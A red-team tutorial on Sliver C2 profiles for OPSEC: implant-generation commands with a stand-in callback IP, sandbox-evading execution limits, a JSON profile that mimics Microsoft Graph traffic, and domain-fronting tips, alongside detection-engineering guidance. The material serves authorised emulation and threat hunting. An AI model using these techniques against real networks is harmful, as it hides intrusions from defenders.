---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.05 Customizing Sliver Profiles for OPSEC"
---

# 95.05 Customizing Sliver Profiles for OPSEC

## Overview

Operational Security (OPSEC) is the discipline of protecting adversary infrastructure and operations from discovery. In the context of Command and Control (C2), OPSEC primarily involves blending in with normal environmental noise. Out-of-the-box C2 frameworks are trivial to detect because their default network behaviors, HTTP headers, and binary signatures are well-known to security vendors.

Sliver employs **Profiles** and **HTTP C2 Profiles** to customize implant generation and network communication behavior. Customizing these profiles ensures that implants mimic legitimate software and network traffic, dramatically increasing the difficulty for Threat Hunters and automated detection systems.

---

## Implant Profiles (Reproducible Builds)

A Sliver Profile is essentially a saved template for generating an implant. Instead of typing a massive command line string with all obfuscation flags, target IPs, and architectures every time, an operator saves these settings into a profile.

### Creating a Profile
```bash
sliver > profiles new --mtls 198.51.100.45:443 --os windows --arch amd64 --format shellcode --obfuscate --skip-symbols --name stealth-win64
```

Once saved, the operator can reliably generate the exact same payload configuration whenever needed:
```bash
sliver > profiles generate --name stealth-win64 --save /tmp/
```

### Execution Constraints (OPSEC Triggers)
Advanced profiles allow operators to define execution constraints. If these conditions are not met, the implant will refuse to execute, effectively preventing security analysts or sandbox environments from analyzing the payload.
- `--limit-datetime`: The implant will only run before a specific timestamp.
- `--limit-domainjoined`: The implant verifies if the host is joined to an Active Directory domain before executing (preventing execution in isolated sandboxes).

---

## HTTP C2 Profiles (Malleable C2)

The most critical OPSEC customization involves HTTP C2 Profiles. Inspired by Cobalt Strike's Malleable C2 profiles, Sliver uses a JSON-based configuration file to dictate exactly how HTTP/S network traffic should look.

### The Objective
Without a custom profile, Sliver traffic might have a default `User-Agent` or predictable URI structures (e.g., `/api/sync`). A custom HTTP C2 profile modifies the traffic to look like legitimate telemetry, such as Windows Update traffic, Microsoft Graph API calls, or jQuery CDN requests.

### Anatomy of an HTTP C2 Profile

**Conceptual JSON Snippet (e.g., Mimicking Microsoft Graph):**
```json
{
    "implant_config": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "url_parameters": ["api-version=1.0", "tenantId=xyz"],
        "headers": {
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""
        },
        "max_files": 5,
        "max_paths": 10,
        "extensions": [".json", ".js"],
        "paths": [
            "/v1.0/me/messages",
            "/v1.0/users",
            "/v1.0/devices"
        ]
    },
    "server_config": {
        "headers": {
            "Server": "Microsoft-IIS/10.0",
            "Content-Type": "application/json; charset=utf-8",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains"
        }
    }
}
```

### How It Works
1. **URI Randomization**: The implant will randomly select paths from the `paths` array for its check-ins.
2. **Header Injection**: Legitimate-looking headers are injected to match standard browser behavior.
3. **Server Spoofing**: The Team Server responds with headers mimicking a legitimate enterprise server (e.g., `Microsoft-IIS/10.0`), confusing simple automated scanners that probe the infrastructure.

---

## ASCII Diagram: HTTP C2 Profile Transformation

```text
       DEFAULT SLIVER HTTP TRAFFIC               CUSTOM PROFILED TRAFFIC
       (High Risk of Detection)                  (Mimicking Microsoft Graph)

   +---------------------------------+       +---------------------------------+
   | POST /login                     |       | GET /v1.0/me/messages?api-ver=1 |
   | Host: 198.51.100.45             |       | Host: graph.windows-telemetry.com|
   | User-Agent: sliver-client/1.5   |       | User-Agent: Mozilla/5.0 (Win...) |
   |                                 |       | Accept: application/json        |
   | [Base64 gRPC Payload]           |       |                                 |
   +---------------------------------+       | [Base64 Payload Hidden in Body] |
                  |                          +---------------------------------+
                  |                                           |
    [IDS ALERTS ON DEFAULT AGENT]               [IDS SEES LEGITIMATE TELEMETRY]
                  |                                           |
                  X                                           v
           BLOCKED BY SOC                             REACHES REDIRECTOR
```

---

## Threat Hunting & Detection Engineering

Custom HTTP Profiles are designed to defeat basic static Network Intrusion Detection System (NIDS) signatures, but they introduce other weaknesses that mature threat hunting teams can exploit.

### 1. Profile Mismatches and Entropy
- **Hunting Strategy**: While an HTTP profile might perfectly mimic Microsoft Graph API URIs, the *payload* sent in the body or cookies is often highly entropic (encrypted base64 data). Legitimate Microsoft Graph requests usually contain structured, predictable JSON. Network parsers (like Zeek) analyzing the entropy or structure of the HTTP body can flag these anomalies.

### 2. Header Ordering and JA3 Mismatches
- **Hunting Strategy**: Browsers construct HTTP headers in a specific, predictable order (e.g., Chrome always places `Host` before `Connection`). Custom HTTP profiles often fail to accurately replicate the exact header ordering of the browser they claim to be.
- **JA3 Correlation**: If the User-Agent claims to be Chrome 114, but the TLS JA3 hash corresponds to a Golang binary, the disparity is a massive red flag. 

### 3. Jitter and Frequency Analysis
Regardless of how legitimate the traffic *looks*, the *behavior* of beaconing remains. Mathematical analysis of connection frequencies (detecting the beaconing interval despite the applied jitter) remains effective regardless of the HTTP profile used.

---

## Real-World Attack Scenario

### Emulating APT29
A Red Team is tasked with emulating APT29 (Cozy Bear). Threat intelligence indicates that APT29 frequently utilizes custom C2 profiles to blend their traffic with Microsoft Azure and Office 365 telemetry to bypass EDR and NIDS.

### Execution
The Red Team crafts a highly specific Sliver HTTP C2 profile. They configure the headers to match exact telemetry endpoints used by Microsoft OneDrive sync clients. They configure the server response to issue fake `Set-Cookie` headers containing session IDs (which actually contain the encrypted C2 instructions).

They deploy the payload. The corporate firewall, which explicitly allows Office 365 traffic and performs SSL inspection, decrypts the traffic, sees valid-looking OneDrive URIs and User-Agents, and permits the traffic. The SOC completely misses the beaconing because the environment generates thousands of legitimate OneDrive requests per minute, masking the C2 traffic in the noise.

---

## Chaining Opportunities

- **Domain Fronting & Fast Flux**: Chain custom HTTP profiles with Domain Fronting (using a high-reputation CDN like Cloudflare) so the SNI (Server Name Indication) and external IP belong to the CDN, while the HTTP Host header routes to the hidden Team Server.
- **Sleep Obfuscation**: Use extensions like `Titan` or BOFs to patch memory permissions while the profile enforces a long sleep (e.g., 4 hours), making the implant invisible in memory between the customized network check-ins.

---

## Related Notes

- [[95.01 Introduction to Sliver C2 Architecture]]
- [[95.04 Sliver Listeners mTLS WireGuard HTTP DNS]]
- [[40.05 Cobalt Strike Malleable C2 Concepts]]
- [[58.02 Network Entropy Analysis and Payload Detection]]
- [[66.08 Evading SSL Inspection with Domain Fronting]]

---
*Note: This material is intended for Threat Hunting, Detection Engineering, and authorized Red Team emulation purposes only.*
